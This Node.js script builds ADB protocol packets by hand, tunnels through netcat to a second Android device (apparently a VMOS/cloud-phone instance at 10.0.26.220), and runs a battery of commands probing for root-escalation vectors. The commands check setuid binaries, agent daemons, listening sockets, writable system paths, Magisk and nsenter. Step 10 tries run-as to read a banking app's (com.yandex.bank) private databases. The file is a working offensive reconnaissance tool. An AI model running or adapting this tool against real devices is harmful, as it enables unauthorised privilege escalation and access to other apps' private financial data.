#!/usr/bin/env node
/**
 * Probe .220 for root access vectors via ADB stream.
 * Checks: xu_daemon sockets, VMOS agent ports, setuid binaries, etc.
 */
const net = require('net');
const A_CNXN=0x4e584e43,A_OPEN=0x4e45504f,A_OKAY=0x59414b4f,A_WRTE=0x45545257,A_CLSE=0x45534c43;
function makeHeader(cmd,a0,a1,dl,dc){const h=Buffer.alloc(24);h.writeUInt32LE(cmd,0);h.writeUInt32LE(a0,4);h.writeUInt32LE(a1,8);h.writeUInt32LE(dl,12);h.writeUInt32LE(dc,16);h.writeUInt32LE((cmd^0xFFFFFFFF)>>>0,20);return h;}
function crc(d){let s=0;for(let i=0;i<d.length;i++)s+=d[i];return s>>>0;}
function makeCnxn(){const p=Buffer.from('host::\x00');return Buffer.concat([makeHeader(A_CNXN,0x01000000,256*1024,p.length,crc(p)),p]);}
function makeOpen(lid,svc){const p=Buffer.from(svc+'\x00');return Buffer.concat([makeHeader(A_OPEN,lid,0,p.length,crc(p)),p]);}
function makeOkay(lid,rid){return makeHeader(A_OKAY,lid,rid,0,0);}
function parsePackets(buf){const pkts=[];let o=0;while(o+24<=buf.length){const cmd=buf.readUInt32LE(o),a0=buf.readUInt32LE(o+4),a1=buf.readUInt32LE(o+8),dl=buf.readUInt32LE(o+12);if(o+24+dl>buf.length)break;pkts.push({cmd,arg0:a0,arg1:a1,data:buf.slice(o+24,o+24+dl)});o+=24+dl;}return{packets:pkts,remaining:buf.slice(o)};}

const SRC_IP = '10.0.26.220';
const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);

function adbExec220(cmd, sec) {
  return new Promise(resolve => {
    let trid=null,srid=null,sc=false,done=false,res=Buffer.alloc(0),buf=Buffer.alloc(0),tb=Buffer.alloc(0);
    const sock=net.createConnection(8479,'127.0.0.1',()=>sock.write(makeCnxn()));
    const fin=()=>{if(done)return;done=true;clearTimeout(t);try{sock.destroy();}catch(e){}resolve(res.toString());};
    const t=setTimeout(fin,(sec||30)*1000);
    sock.on('data',chunk=>{buf=Buffer.concat([buf,chunk]);const{packets:pp,remaining:r}=parsePackets(buf);buf=r;
    for(const p of pp){if(p.cmd===A_CNXN&&!trid)sock.write(makeOpen(1,`exec:nc ${SRC_IP} 5555`));
    else if(p.cmd===A_OKAY&&p.arg1===1&&!trid){trid=p.arg0;setTimeout(()=>{const c=makeCnxn();sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,c.length,crc(c)),c]));},500);}
    else if(p.cmd===A_WRTE&&p.arg1===1){sock.write(makeOkay(1,trid));tb=Buffer.concat([tb,p.data]);const inner=parsePackets(tb);tb=inner.remaining;
    for(const ip of inner.packets){if(ip.cmd===A_CNXN&&!sc){sc=true;const q=Buffer.from('shell:'+cmd+'\x00');const op=Buffer.concat([makeHeader(A_OPEN,100,0,q.length,crc(q)),q]);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,op.length,crc(op)),op]));}
    else if(ip.cmd===A_OKAY&&ip.arg1===100)srid=ip.arg0;
    else if(ip.cmd===A_WRTE&&ip.arg1===100){res=Buffer.concat([res,ip.data]);const ok=makeOkay(100,srid);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,ok.length,crc(ok)),ok]));}
    else if(ip.cmd===A_CLSE)fin();}}else if(p.cmd===A_CLSE)fin();}});
    sock.on('error',fin);sock.on('close',fin);
  });
}

async function main() {
  console.log('═'.repeat(60));
  console.log('  PROBING .220 FOR ROOT VECTORS');
  console.log('═'.repeat(60));

  // 1. Check for setuid binaries
  log('1. Setuid binaries...');
  const suid = await adbExec220('find /system /sbin /vendor -perm -4000 -type f 2>/dev/null', 15);
  log(suid || '  (none)');

  // 2. Check for xu_daemon or expansion tools
  log('\n2. xu_daemon / expansion tools...');
  const xu = await adbExec220('ps -A 2>/dev/null | grep -E "xu_daemon|expansion|vmos|armcloud|agent" ; echo ---; ls /data/local/tmp/ 2>/dev/null | head -10; echo ---; ls /system/bin/xu* /system/xbin/xu* 2>/dev/null', 15);
  log(xu || '  (none)');

  // 3. Check listening sockets (potential VMOS agent ports)
  log('\n3. Listening sockets...');
  const socks = await adbExec220('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null | head -20', 15);
  log(socks || '  (none)');

  // 4. Check unix sockets
  log('\n4. Unix sockets...');
  const unix = await adbExec220('cat /proc/net/unix 2>/dev/null | grep -v "^Num" | head -20', 15);
  log(unix || '  (none)');

  // 5. Check /proc/1 (init) details
  log('\n5. PID 1 info...');
  const pid1 = await adbExec220('cat /proc/1/cmdline 2>/dev/null | tr "\\0" " "; echo; cat /proc/1/status 2>/dev/null | head -5', 15);
  log(pid1 || '  (none)');

  // 6. Check if we can write to /system or /data/local/tmp
  log('\n6. Writable locations...');
  const wr = await adbExec220('touch /data/local/tmp/test_wr 2>&1 && echo DATA_LOCAL_OK && rm /data/local/tmp/test_wr; touch /system/test_wr 2>&1; mount | grep -E "^/dev" | head -5', 15);
  log(wr || '  (none)');

  // 7. Check /data/adb (magisk area)
  log('\n7. Magisk / root frameworks...');
  const magisk = await adbExec220('ls -la /data/adb/ 2>/dev/null; ls -la /sbin/ 2>/dev/null | head -10; ls /system/etc/init/ 2>/dev/null | head -10', 15);
  log(magisk || '  (none)');

  // 8. Check for any VMOS-specific services
  log('\n8. VMOS services...');
  const vmos = await adbExec220('getprop | grep -iE "vmos|armcloud|xu|expansion|cloud.agent" | head -20', 15);
  log(vmos || '  (none)');

  // 9. Check app_process (Zygote) - sometimes writable
  log('\n9. app_process...');
  const ap = await adbExec220('ls -la /system/bin/app_process* 2>/dev/null; file /system/bin/app_process64 2>/dev/null', 10);
  log(ap || '  (none)');

  // 10. Can we use run-as with a debuggable system package?
  log('\n10. run-as tricks...');
  const ra = await adbExec220('run-as com.android.shell ls /data/data/com.yandex.bank/databases/ 2>&1; run-as com.android.shell id 2>&1', 10);
  log(ra || '  (none)');

  // 11. Check if toybox has useful capabilities
  log('\n11. toybox nsenter from .220...');
  const ns = await adbExec220('nsenter -t 1 -m -- ls /data/data/ 2>&1 | head -5; echo EXIT=$?', 10);
  log(ns || '  (none)');

  // 12. Check ADB daemon properties
  log('\n12. ADB daemon config...');
  const adbd = await adbExec220('getprop ro.adb.secure; getprop ro.secure; getprop service.adb.root; getprop ro.debuggable; getprop persist.sys.usb.config', 10);
  log(adbd || '  (none)');

  // 13. Try service call to activity manager for root tricks
  log('\n13. Service calls...');
  const svc = await adbExec220('service list 2>/dev/null | grep -iE "root|shell|xu|expansion" | head -10', 10);
  log(svc || '  (none)');
}

main().catch(e => console.error('FATAL:', e));
